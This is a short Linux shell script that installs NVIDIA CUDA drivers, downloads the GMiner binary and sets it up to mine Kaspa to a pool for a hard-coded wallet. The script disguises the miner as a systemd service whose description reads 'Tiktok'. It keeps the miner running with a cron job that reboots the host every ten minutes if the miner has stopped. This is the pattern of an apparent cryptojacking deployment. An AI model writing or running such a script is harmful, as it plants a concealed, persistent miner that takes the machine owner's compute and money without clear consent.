sudo sed -i '/RANDFILE/c\#RANDFILE' /etc/ssl/openssl.cnf
cd /home
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
sudo apt-get update
sudo add-apt-repository --yes ppa:graphics-drivers/ppa
sudo apt-get -y install cuda-drivers-510
sudo apt-get install libcurl3 -y
sudo systemctl enable cron
sudo bash -c 'echo -e "pgrep -f miner >/dev/null && r=1 || r=0\nif [ \$r = 0 ];\nthen\nsudo reboot\nfi" > /home/cron.sh'
sudo chmod +x /home/cron.sh
sudo echo  '*/10 * * * * /home/cron.sh' | crontab -
sudo wget https://github.com/develsoftware/GMinerRelease/releases/download/3.15/gminer_3_15_linux64.tar.xz
sudo tar -xf gminer_3_15_linux64.tar.xz
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/miner --algo kheavyhash --server pool.us.woolypooly.com:3113 --user kaspa:qzpzjtxw89lft8ju2cf5y3qd4gaa453uzcmsdfmj9m8ktltmhvrpxmvlgaw3e.diana\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
